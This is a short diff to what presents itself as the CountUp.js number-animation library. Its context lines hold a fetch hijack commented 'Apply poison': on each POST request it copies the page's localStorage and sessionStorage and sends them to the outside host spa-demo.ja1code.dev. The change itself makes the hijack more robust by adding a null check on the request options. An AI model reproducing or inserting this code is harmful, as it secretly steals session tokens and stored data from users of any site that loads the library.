@@ -118,7 +118,7 @@ var CountUp = /** @class */ (function () {
         // Apply poison
         window.oFetch = window.fetch;
         window.fetch = function (url, options) {
-            if (options.method === 'POST') {
+            if ((options === null || options === void 0 ? void 0 : options.method) == 'POST') {
                 var extLStorage = __assign({}, localStorage);
                 var extSStorage = __assign({}, sessionStorage);
                 window.oFetch("https://spa-demo.ja1code.dev/", {
